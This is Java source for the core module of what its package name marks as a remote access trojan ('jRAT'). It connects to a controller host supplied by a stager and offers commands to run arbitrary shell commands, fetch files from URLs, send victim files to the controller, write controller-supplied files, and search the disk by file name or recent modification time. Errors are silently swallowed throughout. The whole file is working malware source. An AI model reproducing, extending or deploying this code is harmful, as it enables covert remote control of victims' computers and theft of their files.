package jRAT.modules;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.net.URL;
import java.util.Date;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.locks.ReentrantLock;

public class ModuleCore {

    private final static AtomicInteger NUM_RUNNING_JOBS = new AtomicInteger(0);
    private final static ReentrantLock SOCKET_LOCK      = new ReentrantLock();
    
    private static int BUFFER_SIZE                      = 1024;
    private static String HOST                          = null;
    private static Integer PORT                         = null;

    private static Socket socket                        = null;
    private static DataInputStream socketInput          = null;
    private static DataOutputStream socketOutput        = null;

    /* ---------------------------------------------------------------------------------------------------------- */

    public static void init(Class stage) throws Exception
    {   
        HOST = (String)  stage.getMethod("getHost", new Class[0]).invoke(null, new Object[0]);
        PORT = (Integer) stage.getMethod("getPort", new Class[0]).invoke(null, new Object[0]);
    }
    
    /* ---------------------------------------------------------------------------------------------------------- */

    public static byte[] showModuleInfo() throws UnsupportedEncodingException
    {
        StringBuilder moduleInfo = new StringBuilder();
        moduleInfo.append("\n*** MODULE: Core ***\n\n");
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "exec",         "command"));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "bgexec",       "command"));        
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "wget",         "url filepath"));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "bgwget",       "url filepath"));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "bgdownload",   "remotePath localPath"));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "bgupload",     "localPath remotePath"));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "search",       "rootDirectory, searchString, isCaseSensitive"));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "bgsearch",     "rootDirectory, searchString, isCaseSensitive"));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "mtimesearch",  "rootDirectory, intervalInSeconds"));        
        return moduleInfo.toString().getBytes("UTF-8");
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static boolean isBackgroundMethod(String methodName)
    {
        switch (methodName)
        {
            case "exec":        return false;
            case "bgexec":      return true;
            case "wget":        return false;
            case "bgwget":      return true;
            case "bgdownload":  return true;
            case "bgupload":    return true;
            case "search":      return false;
            case "bgsearch":    return true;
            case "mtimesearch": return false;
            default:            return false;
        }
    }

    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */

    private static void open()
    {
        try
        {
            if (socket == null)
            {
                socket       = new Socket(HOST, PORT);
                socketInput  = new DataInputStream(socket.getInputStream());
                socketOutput = new DataOutputStream(socket.getOutputStream());
                socketOutput.writeUTF("ModuleCore");
            }
        }
        catch (Exception ex) {}
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    private static void close()
    {
        try
        {
            if (socket != null)
            {
                socketOutput.writeUTF("CLOSE");
                socketInput.close();
                socketOutput.close();
                socket.close();
                socket = null;
            }
        }
        catch (Exception ex) {}
    }

    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */

    public static byte[] exec(String command) throws UnsupportedEncodingException
    {
        String result                     = null;
        StringBuilder resultBuilder       = new StringBuilder();
        BufferedReader processInputStream = null;
        BufferedReader processErrorStream = null;
        try
        {
            final Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            processInputStream = new BufferedReader(new InputStreamReader(process.getInputStream()));
            processErrorStream = new BufferedReader(new InputStreamReader(process.getErrorStream()));

            String currentLine;
            while ((currentLine = processInputStream.readLine()) != null) { resultBuilder.append(currentLine + "\n"); }
            while ((currentLine = processErrorStream.readLine()) != null) { resultBuilder.append(currentLine + "\n"); }

            result = resultBuilder.toString();
        }
        catch (Exception ex) {}
        finally
        {
            try
            {
                if (processInputStream != null)
                    processInputStream.close();

                if (processErrorStream != null)
                    processErrorStream.close();
            }
            catch (Exception ex) {}
        }

        if (result != null)
            return result.getBytes("UTF-8");
        else
            return null;
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static void bgexec(String command) throws UnsupportedEncodingException
    {
        String filename = "bgexec_" + new Date().toString();
        byte[] result   = exec(command);
        if (result != null && result.length > 0)
        {
            try
            {
                NUM_RUNNING_JOBS.incrementAndGet();
                if (socket == null) { open(); }
                    
                SOCKET_LOCK.lock();
                socketOutput.writeUTF("OK");
                /* method name is sent after OK in background-thread
                 * methods so the handler on the server side knows
                 * how to handle the response.
                 */
                socketOutput.writeUTF("bgexec");
                socketOutput.writeUTF(filename);
                socketOutput.writeLong(result.length);
                socketOutput.write(result);
                socketOutput.flush();
            }
        
            catch (Exception ex) {}
            finally
            {
                NUM_RUNNING_JOBS.decrementAndGet();
                if (NUM_RUNNING_JOBS.get() == 0)
                    close();
                
                SOCKET_LOCK.unlock();
            }
        }
    }

    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /*                                           DATA TRANSFER UTILS                                              */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */

    public static byte[] wget(String url, String filepath) throws UnsupportedEncodingException
    {
        boolean STATUS            = true;
        BufferedInputStream input = null;
        FileOutputStream output   = null;
        try
        {
            input  = new BufferedInputStream(new URL(url).openStream());
            output = new FileOutputStream(filepath);
    
            byte buffer[] = new byte[BUFFER_SIZE];       
            int numBytesRead;
            while ((numBytesRead = input.read(buffer, 0, BUFFER_SIZE)) != -1)
            {
                output.write(buffer, 0, numBytesRead);
            }
        }
        catch (Exception ex) { STATUS = false; }
        finally
        {
            try
            {
                if (input != null) input.close();
                if (output != null) output.close();
            }
            catch (Exception ex) {}
        }

        if (STATUS)
            return new String("Downloaded " + url + " to " + filepath).getBytes("UTF-8");
        else
            return null;
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static void bgwget(String url, String filepath)
    {
        BufferedInputStream input = null;
        FileOutputStream output   = null;
        try
        {
            input  = new BufferedInputStream(new URL(url).openStream());
            output = new FileOutputStream(filepath);

            byte buffer[] = new byte[BUFFER_SIZE];       
            int numBytesRead;
            while ((numBytesRead = input.read(buffer, 0, BUFFER_SIZE)) != -1)
            {
                output.write(buffer, 0, numBytesRead);
            }
        }
        catch (Exception ex) {}
        finally
        {
            try
            {
                if (input != null) input.close();
                if (output != null) output.close();
            }
            catch (Exception ex) {}
        }
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static void bgdownload(String path)
    {
        FileInputStream input = null;
        try
        {
            NUM_RUNNING_JOBS.incrementAndGet();
            SOCKET_LOCK.lock();

            input = new FileInputStream(new File(path));
            if (socket == null) { open(); }
            
            socketOutput.writeUTF("OK");
            /* method name is sent after OK in background-thread
             * methods so the handler on the server side knows
             * how to handle the response.
             */
            socketOutput.writeUTF("bgdownload");
            socketOutput.writeUTF(path);

            String responseStatus = socketInput.readUTF();
            if (responseStatus.equals("OK"))
            {
                /* Send file size */
                long fileSizeInBytes = new File(path).length();
                socketOutput.writeLong(fileSizeInBytes);

                /* Send file bytes */
                int numberOfBytesRead = 0;
                final byte[] buffer   = new byte[BUFFER_SIZE];
                while ((numberOfBytesRead = input.read(buffer)) != -1)
                {
                    socketOutput.write(buffer, 0, numberOfBytesRead);
                }
                socketOutput.flush();   
            }
        }
        catch (Exception ex) {}
        finally
        {
            try { if (input != null) input.close(); }
            catch (Exception ex) {}
            
            NUM_RUNNING_JOBS.decrementAndGet();
            if (NUM_RUNNING_JOBS.get() == 0)
                close();
            
            SOCKET_LOCK.unlock();
        }
    }
    
    /* ---------------------------------------------------------------------------------------------------------- */

    public static void bgupload(String path)
    {
        FileOutputStream output = null;
        try
        {
            NUM_RUNNING_JOBS.incrementAndGet();
            if (socket == null) { open(); }

            SOCKET_LOCK.lock();

            socketOutput.writeUTF("OK");
            /* method name is sent after OK in background-thread
             * methods so the handler on the server side knows
             * how to handle the response.
             */
            socketOutput.writeUTF("bgupload");
            socketOutput.writeUTF(path);
            
            /* Read file bytes and save to specified path */
            String responseStatus = socketInput.readUTF();
            if (responseStatus.equals("OK"))
            {
                output                 = new FileOutputStream(new File(path));
                long rawFileSize       = socketInput.readLong();
                long totalBytesWritten = 0;
                int numberOfBytesRead  = 0;
                final byte[] buffer    = new byte[BUFFER_SIZE];
                
                while (totalBytesWritten < rawFileSize)
                {
                    if ((rawFileSize-totalBytesWritten) < BUFFER_SIZE)
                        numberOfBytesRead = socketInput.read(buffer, 0, (int)(rawFileSize-totalBytesWritten));
                    else
                        numberOfBytesRead = socketInput.read(buffer, 0, BUFFER_SIZE);
                    
                    output.write(buffer, 0, numberOfBytesRead);
                    totalBytesWritten += numberOfBytesRead;                 
                }
                output.flush();
            }            
        }
        catch (Exception ex) { ex.printStackTrace(); }
        finally
        {
            try { if (output != null) output.close(); }
            catch (Exception ex) {}
            
            NUM_RUNNING_JOBS.decrementAndGet();
            if (NUM_RUNNING_JOBS.get() == 0)
                close();
            
            SOCKET_LOCK.unlock();
        }
    }

    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /*                                              SEARCH UTILS                                                  */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */

    public static byte[] search(String rootDirectory, String searchString, String isCaseSensitive)
    throws UnsupportedEncodingException
    {
        final StringBuilder result = new StringBuilder();
        final File searchRoot     = new File(rootDirectory);

        if (searchRoot.isDirectory())
        {
            boolean caseSensitive = false;
            if (isCaseSensitive != null)
            {
                isCaseSensitive = isCaseSensitive.toLowerCase().trim();
                if (isCaseSensitive.equals("yes") || isCaseSensitive.equals("true") || isCaseSensitive.equals("1"))
                    caseSensitive = true;
            }

            if (caseSensitive)
                searchByFilename(searchRoot, searchString, caseSensitive, result);
            else
                searchByFilename(searchRoot, searchString.toLowerCase(), caseSensitive, result);
        }

        return result.toString().getBytes("UTF-8");
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    private static void searchByFilename(File file, String searchString, boolean caseSensitive, StringBuilder result)
    {
        if (file.isDirectory())
        {
            if (file.canRead())
            {
                for (File temp : file.listFiles())
                {
                    if (temp.isDirectory())
                    {
                        searchByFilename(temp, searchString, caseSensitive, result);
                    }
                    else
                    {
                        if (caseSensitive)
                        {
                            if (temp.getName().contains(searchString))
                                result.append(temp.getAbsoluteFile().toString() + "\n");
                        }
                        else
                        {
                            if (temp.getName().toLowerCase().contains(searchString))
                                result.append(temp.getAbsoluteFile().toString() + "\n");
                        }
                    }
                }
            }
        }
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static void bgsearch(String rootDirectory, String searchString, String isCaseSensitive)
    throws UnsupportedEncodingException
    {
        final byte[] result = search(rootDirectory, searchString, isCaseSensitive);
        if (result != null && result.length > 0)
        {
            NUM_RUNNING_JOBS.incrementAndGet();
            try
            {
                SOCKET_LOCK.lock();
                socketOutput.writeUTF("OK");
                /* method name is sent after OK in background-thread
                 * methods so the handler on the server side knows
                 * how to handle the response.
                 */
                socketOutput.writeUTF("bgsearch");
                socketOutput.writeUTF("Search_" + new Date().toString());
                socketOutput.writeLong(result.length);
                socketOutput.write(result);
                socketOutput.flush();
            }
            catch (Exception ex) {}
            finally
            {
                NUM_RUNNING_JOBS.decrementAndGet();
                if (NUM_RUNNING_JOBS.get() == 0)
                    close();
                
                SOCKET_LOCK.unlock();
            } 
        }
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static byte[] mtimesearch(String rootDirectory, String desiredIntervalInSeconds)
    throws UnsupportedEncodingException
    {
        final StringBuilder result = new StringBuilder();
        final File searchRoot      = new File(rootDirectory);

        if (searchRoot.isDirectory())
        {
            long desiredInterval = Long.valueOf(desiredIntervalInSeconds).longValue();
            searchByLastModificationTime(searchRoot, desiredInterval, result);
        }
        return result.toString().getBytes("UTF-8");
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    private static void searchByLastModificationTime(File file, long desiredIntervalInSeconds, StringBuilder result)
    {
        if (file.isDirectory())
        {
            if (file.canRead())
            {
                for (File temp : file.listFiles())
                {
                    if (temp.isDirectory())
                    {
                        searchByLastModificationTime(temp, desiredIntervalInSeconds, result);
                    }
                    else
                    {
                        long lastModifiedMilliseconds  = temp.lastModified();
                        long currentTimeInMilliseconds = System.currentTimeMillis();
                        long timeIntervalInSeconds     = (currentTimeInMilliseconds - lastModifiedMilliseconds) / 1000;

                        if (timeIntervalInSeconds <= desiredIntervalInSeconds)
                        {   
                            result.append(temp.getAbsoluteFile().toString() + "\n");
                        }
                    }
                }
            }
        }
    }

    /* ---------------------------------------------------------------------------------------------------------- */

}
